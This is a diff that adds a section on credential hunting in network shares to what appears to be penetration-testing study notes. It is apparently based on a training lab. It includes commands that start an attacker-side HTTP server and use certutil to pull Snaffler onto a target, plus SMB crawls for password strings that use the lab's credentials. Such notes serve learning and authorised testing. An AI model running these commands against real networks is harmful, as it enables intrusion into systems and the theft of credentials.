@@ -28,6 +28,7 @@ This document outlines common techniques used in **password attacks**. It is int
   - [Extracting Passwords From the Network](#extracting-passwords-from-the-network)
     - [Credential Hunting in Network Traffic](#credential-hunting-in-network-traffic)
     - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
+  - [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
 
 ---
 
@@ -1861,3 +1862,84 @@ Example:
 ---
 
 ### Credential Hunting in Network Shares
+
+Most corporate environments use **network shares** for centralized file storage and collaboration. These shared folders frequently contain configuration files, scripts, backups, and documentation, making them an excellent target for credential hunting.
+
+Credential hunting in network shares can be automated with tools such as:
+
+- [Snaffler](https://github.com/SnaffCon/Snaffler)
+- [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)
+- [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)
+- [NetExec](https://github.com/Pennyw0rth/NetExec)
+
+#### Snaffler
+
+**Snaffler** is a C# tool designed to enumerate accessible network shares from a domain-joined system and search for interesting files such as documents, configuration files, and scripts that may contain credentials.
+
+**Transfer Snaffler to the Target**
+
+Start an HTTP server on the attacker machine:
+
+```bash
+python3 -m http.server 8001
+```
+
+Download the executable on the target:
+
+```powershell
+certutil.exe -urlcache -split -f http://10.10.14.51:8001/Snaffler.exe
+```
+
+Run a basic scan:
+
+```powershell
+Snaffler.exe -s -o snaffler.log
+```
+
+Snaffler generates significant output. By adding the `-u` flag, it pulls user accounts from Active Directory and prioritizes files referencing those users:
+
+```powershell
+Snaffler.exe -s -o snaffler.log -u
+```
+
+![Filtered output](./.images/snaffler1.PNG)
+
+#### MANSPIDER
+
+`MANSPIDER` allows crawling SMB shares remotely from a Linux system, searching for sensitive strings across documents without needing execution on the target host.
+
+Installation
+
+```bash
+pip install pipx
+pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
+```
+
+Search SMB shares for files containing password-related strings:
+
+```bash
+manspider 10.129.9.185 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+```
+
+![Filtered output](./.images/manspider.PNG)
+
+#### NetExec
+
+`NetExec` can also enumerate and crawl SMB shares while searching file contents for keywords.
+
+Example:
+
+```bash
+nxc smb 10.129.9.185 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
+```
+
+This command:
+
+- Authenticates to the target SMB server
+- Crawls the IT share
+- Searches file contents
+- Looks for the keywords passw and user
+
+---
+
+## Windows Lateral Movement Techniques
